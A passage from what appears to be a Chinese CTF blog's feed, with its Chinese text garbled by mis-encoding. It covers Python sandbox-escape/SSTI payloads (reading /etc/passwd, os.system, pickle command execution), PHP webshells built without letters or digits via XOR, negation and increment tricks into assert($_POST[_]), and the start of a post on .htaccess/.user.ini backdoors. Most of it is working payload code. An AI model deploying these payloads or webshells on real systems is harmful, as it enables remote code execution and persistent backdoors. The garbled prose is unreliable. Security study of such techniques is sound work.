title="è¿‡æ»¤åŒä¸‹åˆ’çº¿"></a>è¿‡æ»¤åŒä¸‹åˆ’çº¿</h3><p>åŒæ ·åˆ©ç”¨  requests.args å±æ€§</p><pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><p>é™¤äº†ç¼–ç ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥</p><p><code>__getattribute__</code> ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³•</p><pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></pre><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><ol><li>func_globals</li></ol><p>è¿”å›åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨-å®šä¹‰å‡½æ•°çš„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</p><ol start="2"><li><strong>getattribute</strong></li></ol><p>è¢«è°ƒç”¨æ— æ¡ä»¶åœ°å®ç°ç±»çš„å®ä¾‹çš„å±æ€§è®¿é—®</p><pre><code>object. getattribute(self, name)1ï¼‰self å¿…éœ€çš„ã€‚ç±»çš„å®ä¾‹ï¼Œåœ¨è°ƒç”¨æ—¶è‡ªåŠ¨ä¼ é€’ã€‚2ï¼‰name å¿…éœ€çš„ã€‚å±æ€§çš„åç§°ã€‚</code></pre><ol start="3"><li><strong>subclasses</strong>()[]</li></ol><p>è·å–å­ç±»</p><ol start="4"><li>getattr</li></ol><p>è¿”å›å¯¹è±¡çš„å‘½åå±æ€§çš„å€¼</p><pre><code>getattr(object,name) &lt;=&gt; object.name&gt;&gt;&gt; class A():...     bar =1...&gt;&gt;&gt; a = A()&gt;&gt;&gt; getattr(a,&apos;bar&apos;)1</code></pre><ol start="5"><li><strong>name</strong></li></ol><p>ä½¿ç”¨ sys.modules[<strong>name</strong>] è·å¾—æ¨¡å—çš„å¼•ç”¨</p><ol start="6"><li><p>timeit</p><p> timeit(å‘½ä»¤ï¼Œnumber=1)</p><p> import timeit<br> timeit.timeit(â€œ<strong>import</strong>(â€˜osâ€™).system(â€˜dirâ€™)â€,number=1) </p></li><li><p>platform</p></li></ol><p>æ¨¡å—å’Œå¹³å°æœ‰å…³ï¼Œä¸»è¦æ˜¯è¿”å›å¹³å°çš„ä¸€äº›ä¿¡æ¯</p><pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start="8"><li><strong>globals</strong></li></ol><p>å¸¸ä¸ <code>__init__</code> é…åˆä½¿ç”¨ï¼Œ<code>__init__</code> ä¸€èˆ¬è·Ÿåœ¨ç±»çš„åé¢ã€‚ç›¸å½“äºå®ä¾‹åŒ–è¿™ä¸ªç±»</p><pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start="9"><li><strong>call</strong></li></ol><p>ä½¿å®ä¾‹èƒ½å¤Ÿåƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ <code>x.call() &lt;=&gt; x()</code></p><ol start="10"><li>pickle</li></ol><p>å°†å¯¹è±¡å‚¨å­˜åœ¨å­—ç¬¦ä¸²å¯¹è±¡ä¸­ï¼Œå®ç°å¯¹è±¡çš„æŒä¹…åŒ–</p><p>åºåˆ—åŒ–ï¼š</p><pre><code>import pickletest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])p=pickle.dumps(test)</code></pre><p>ååºåˆ—åŒ–ï¼š</p><pre><code>n=pickle.loads(p)</code></pre><p>æˆ‘ä»¬å¯ä»¥åŠ è½½å‘½ä»¤ï¼š</p><pre><code>pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)</code></pre><ol start="11"><li><p>os/subprocess/commands</p><p>os.system(â€˜ipconfigâ€™)<br>os.popen(â€˜ipconfigâ€™)<br>commands.getoutput(â€˜ipconfigâ€™)<br>commands.getstatusoutput(â€˜ifconfigâ€™)<br>subrocess.call([â€˜ipconfigâ€™],shell=true)</p></li><li><p>eval/exec/execfile</p><p>eval() æ‰§è¡Œ python è¡¨è¾¾å¼æ‰§è¡Œçš„ç»“æœ</p><p>exec() åŠ¨æ€æ‰§è¡Œ python ä»£ç ï¼Œå¯ä»¥æ‰§è¡Œå¤æ‚çš„ python ä»£ç ï¼Œeval åªèƒ½è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼</p><p>execfile() æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶æ˜¯å°†è¢«è§£æä¸º python åºåˆ—çš„ç±»ä¼¼æ¨¡å—çš„æ–‡ä»¶</p></li></ol><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://www.cnblogs.com/hester/p/4694499.html" target="_blank" rel="noopener">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href="https://www.restran.net/2015/10/22/how-python-code-run/" target="_blank" rel="noopener">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href="https://www.zhihu.com/question/38791962?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/38791962?sort=created</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç‰¹æ®Šçš„webshell</title>
      <link href="/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/"/>
      <url>/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="ç‰¹æ®Šçš„webshell"><a href="#ç‰¹æ®Šçš„webshell" class="headerlink" title="ç‰¹æ®Šçš„webshell"></a>ç‰¹æ®Šçš„webshell</h1><h2 id="ä¸åŒ…å«æ•°å­—å­—æ¯"><a href="#ä¸åŒ…å«æ•°å­—å­—æ¯" class="headerlink" title="ä¸åŒ…å«æ•°å­—å­—æ¯"></a>ä¸åŒ…å«æ•°å­—å­—æ¯</h2><pre><code>&lt;?php@highlight_file(__FILE__);if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) { eval($_GET[&apos;shell&apos;]);}?&gt;</code></pre><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><p>å¼‚æˆ–æ˜¯å¯¹å­—ç¬¦çš„asciiç è¿›è¡Œé€ä½å¼‚æˆ–ä»¥åå¾—åˆ°ä¸€ä¸ªå¼‚æˆ–ç»“æœasciiç çš„å­—ç¬¦ã€‚ç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯è¿™æ ·æ¥ç»•è¿‡æ•°å­—å­—æ¯çš„æ£€æµ‹ã€‚</p><pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01$b=urldecode(&apos;`&apos;);   //ascii 96echo $a^$b;             //a96:  0110 0000%01: 0000 0001         //ç›¸å½“äºascii+1</code></pre><p>æˆ‘ä»¬ç»Ÿä¸€é€‰å– <strong>â€˜`â€™</strong> ä½œä¸ºæˆ‘ä»¬å¼‚æˆ–çš„èµ·ç‚¹ï¼Œå› ä¸ºä»–çš„ ascii æ˜¯96ã€‚</p><pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;$___=$$__;$_($___[_]); // assert($_POST[_]);</code></pre><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><h3 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h3><p>é€šè¿‡å–åå°†æ±‰å­—ç¼–ç ä¸­çš„ç¼–ç å–å‡ºæ¥è¿›è¡Œå–å</p><pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//åˆ©ç”¨å¼±ç±»å‹çš„ç‰¹æ€§$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);$_=$__/$__;echo $_;echo ~(&apos;å’Œ&apos;{2});              //s</code></pre><p>payload:</p><pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);$_=$__/$__;$____=&apos;&apos;;$___=&quot;ç°&quot;;$____.=~($___{$_});$___=&quot;å’Œ&quot;;$____.=~($___{$__});$___=&quot;å’Œ&quot;;$____.=~($___{$__});$___=&quot;çš„&quot;;$____.=~($___{$_});$___=&quot;åŠ&quot;;$____.=~($___{$_});$___=&quot;å§‹&quot;;$____.=~($___{$__});$_____=&apos;_&apos;;$___=&quot;ä¿¯&quot;;$_____.=~($___{$__});$___=&quot;ç°&quot;;$_____.=~($___{$__});$___=&quot;æ¬¡&quot;;$_____.=~($___{$_});$___=&quot;ç«™&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><h3 id="å­—ç¬¦é€’å¢"><a href="#å­—ç¬¦é€’å¢" class="headerlink" title="å­—ç¬¦é€’å¢"></a>å­—ç¬¦é€’å¢</h3><blockquote><p>åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Perl ä¸­ $a = â€˜Zâ€™; $a++; å°†æŠŠ $a å˜æˆâ€™AAâ€™ï¼Œè€Œåœ¨ C ä¸­ï¼Œa = â€˜Zâ€™; a++; å°†æŠŠ a å˜æˆ â€˜[â€˜ï¼ˆâ€™Zâ€™ çš„ ASCII å€¼æ˜¯ 90ï¼Œâ€™[â€˜ çš„ ASCII å€¼æ˜¯ 91ï¼‰ã€‚æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚ </p></blockquote><pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;$a = 5;echo &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\n&quot;; //5echo &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\n&quot;;   //6$c = &apos;b&apos;;echo $c++.&quot;&lt;br /&gt;\n&quot;;                     //becho $c.&quot;\n&quot;;                               //c?&gt;</code></pre><p>æˆ‘ä»¬åªè¦æ‹¿åˆ°ä¸€ä¸ªå˜é‡å€¼ä¸º <code>a</code> ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå°±å¯ä»¥è·å¾— <code>a-z</code> ä¸­æ‰€æœ‰å­—ç¬¦ã€‚</p><p>phpä¸­å¦‚æœå¼ºåˆ¶é“¾æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå€¼ä¸º <code>Arrary</code> </p><pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>æˆ‘ä»¬å–ç¬¬ä¸€ä¸ªå­—ç¬¦å°±å¯ä»¥å¾—åˆ° <code>A</code> äº†ã€‚</p><p>payload:</p><pre><code>&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id="é™åˆ¶é•¿åº¦"><a href="#é™åˆ¶é•¿åº¦" class="headerlink" title="é™åˆ¶é•¿åº¦"></a>é™åˆ¶é•¿åº¦</h2><p>PHPå¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼š</p><pre><code>function B(){    echo &quot;hello world!&quot;;}$_++;           //1echo $_;$__ = &apos;?&apos;^&apos;}&apos;; //Becho $__;$__();</code></pre><p>é¢˜ç›®ï¼š</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>é™åˆ¶é•¿åº¦ä¸º40ï¼Œä¹‹å‰çš„å¼‚æˆ–ä¸è¡Œäº†ã€‚æˆ‘ä»¬è¦åˆ©ç”¨PHPå…è®¸åŠ¨æ€æ‰§è¡Œå‡½æ•°çš„ç‰¹ç‚¹ï¼Œæ„é€ ä¸€ä¸ª <code>_GET</code> æ¥å»è¯»å– <code>getFlag()</code> </p><p>å¯ä»¥é€šè¿‡è¿ç»­è°ƒç”¨å¼‚æˆ–æ¥è·å¾— <code>_GET</code> </p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>é€šè¿‡æ„é€  <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> æ¥è·å–å‚æ•°</p><p>æœ€åä¼ å…¥å‚æ•° getFlag</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>åé¢çš„ <code>__</code> æˆ‘ä»¬ä¸ä¼ å€¼é»˜è®¤ä¸º <code>NULL</code> ä¹Ÿå°±ç›¸å½“äº <code>getFlag()</code></p><p>äº‹å®ä¸Šä¸‹é¢è¿™ä¹Ÿå¯ä»¥ï¼š</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>å¯¹ <code>getFlag</code> è¿›è¡Œå–åç„¶å <code>URL</code> ç¼–ç </p><pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>è¿™ä¸ªåœ¨{}ä¸­è¿›è¡Œå–å <code>${~&quot;\xa0\xb8\xba\xab&quot;}</code> ï¼Œç›¸å½“äº <code>$_GET</code>ï¼Œæ‹¼æ¥å‡ºäº† <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>ï¼Œä¼ å…¥ <code>+=getFlag()</code> ä»è€Œæ‰§è¡Œäº†å‡½æ•°`</p><h2 id="ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿"><a href="#ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿" class="headerlink" title="ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿"></a>ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿</h2><p>é¢˜ç›®ï¼š</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;  </code></pre><p>é€šè¿‡ä¸Šé¢çš„å–åå°±å¯ä»¥äº†</p><pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;$c = &quot;_GET&quot;;echo urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>è¿™é‡Œåˆ©ç”¨ <code>${}</code> ä¸­çš„ä»£ç å¯ä»¥æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œåœ¨ <code>{}</code> é‡Œè¿›è¡Œå–åæ“ä½œï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯å˜å˜é‡</p><pre><code>&lt;?php    $a = &apos;hello&apos;;    $$a = &apos;world&apos;;    echo &quot;$a ${$a}&quot;;?&gt;è¾“å‡ºï¼šhello world</code></pre><p>è¿™é‡Œçš„ <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> ç›¸å½“äº <code>$_GET</code> .</p><p>è¿˜æœ‰æ›´éªšçš„ï¼Œç”¨ä¸­æ–‡ï¼š</p><pre><code>code=$å•Š=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>ç›¸å½“äºç›´æ¥ç»™å˜é‡èµ‹å€¼äº†ï¼Œè¿™æ ·å°±ä¸ç”¨ <code>{}</code> äº†</p><h2 id="ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€"><a href="#ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€" class="headerlink" title="ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$"></a>ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$</h2><pre><code>&lt;?php include &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code=$_GET[&apos;code&apos;];    if(strlen($code)&gt;35){    die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    {        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p><p><code>?&gt;</code> é—­åˆphpæ–‡ä»¶å¼€å¤´çš„ <code>&lt;?php</code> , <code>&lt;?</code> ç›¸å½“äº <code>&lt;? echo</code> .</p><p>åœ¨é…ç½®æ–‡ä»¶ä¸­å¼€å¯ <code>short_open_tag</code> åå¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ã€‚é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</p><h2 id="another-test"><a href="#another-test" class="headerlink" title="another test"></a>another test</h2><pre><code>&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&apos;_&apos;];if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $_) )    die(&apos;rosÃ© will not do it&apos;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&apos;you are so close, omg&apos;);eval($_);?&gt;</code></pre><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¤§ä½¬çš„æ£€æµ‹å¯ç”¨å‡½æ•°çš„è„šæœ¬ï¼š</p><pre><code>&lt;?php $arr = get_defined_functions()[&apos;internal&apos;];foreach ($arr as $key =&gt; $value) {    if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $value) ){        unset($arr[$key]);        continue;    }    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){        unset($arr[$key]);        continue;    }}var_dump($arr);?&gt;</code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p><p><a href="https://xz.aliyun.com/t/5677#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•</title>
      <link href="/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini"><a href="#ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini" class="headerlink" title="ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini"></a>ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini</h1><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>ä»¥ä¸‹éƒ¨åˆ†æ‘˜å–äºPç¥çš„åšå®¢<a href="http://www.vuln.cn/6001" title="Pç¥åšå®¢" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><h3 id="user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title=".user.ini æ˜¯ä»€ä¹ˆï¼Ÿ"></a>.user.ini æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨<code>.user.ini</code>æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•ã€‚ç›¸æ¯”äº<code>.htaccess</code>æœ‰æ›´å¤§çš„åˆ©ç”¨ç©ºé—´ã€‚ </p><p>æˆ‘ä»¬ä»phpæ‰‹å†Œå¯ä»¥çœ‹åˆ°php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯é…ç½®é€‰é¡¹åˆ—è¡¨<a href="https://www.php.net/manual/zh/ini.list.php" title="é…ç½®é¡¹åˆ—è¡¨" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.list.php</a>  ä»è¡¨ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ <code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_SYSTEM</code>    ã€<code>PHP_INI_USER</code>ã€<code>PHP_INI_ALL</code> å››ç§æ¨¡å¼ï¼Œé‚£ä¹ˆè¿™å››ç§æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ  </p><pre><code>æ¨¡å¼                å«ä¹‰PHP_INI_USER    å¯åœ¨ç”¨æˆ·è„šæœ¬ï¼ˆä¾‹å¦‚ ini_set() ï¼‰æˆ– Windows æ³¨å†Œè¡¨ï¼ˆè‡ª PHP 5.3 èµ·ï¼‰ä»¥åŠ .user.ini ä¸­è®¾å®šPHP_INI_PERDIR    å¯åœ¨ php.iniï¼Œ.htaccess æˆ– httpd.conf ä¸­è®¾å®šPHP_INI_SYSTEM    å¯åœ¨ php.ini æˆ– httpd.conf ä¸­è®¾å®šPHP_INI_ALL        å¯åœ¨ä»»ä½•åœ°æ–¹è®¾å®š</code></pre><p>è¿™é‡Œæåˆ°äº†æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®çš„æ¨¡å¼æœ‰ <code>PHP_INI_USER</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº† <code>.user.ini</code> ã€‚ç¿»é˜…æ‰‹å†Œ<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" title="æ‰‹å†Œ" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a>å¯çŸ¥ï¼š</p><blockquote><p>è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ .htaccess é£æ ¼çš„ INI æ–‡ä»¶ã€‚æ­¤ç±»æ–‡ä»¶ä»…è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½¿ç”¨ Apacheï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚</p><p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p><p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ <strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI 